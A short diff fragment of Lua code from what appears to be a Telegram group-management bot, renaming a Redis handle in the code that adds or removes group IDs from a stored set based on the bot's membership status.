 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
-DevBRAND:srem(BRAND..'BRAND:Groups',v)  
+DevABS:srem(BRAND..'BRAND:Groups',v)  
 end
 if data and data.code_ and data.code_ == 400 then
-DevBRAND:srem(BRAND..'BRAND:Groups',v)  
+DevABS:srem(BRAND..'BRAND:Groups',v)  
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
-DevBRAND:sadd(BRAND..'BRAND:Groups',v)  
+DevABS:sadd(BRAND..'BRAND:Groups',v)  
 end end,nil) end
 end
 --     Source BRAND     --
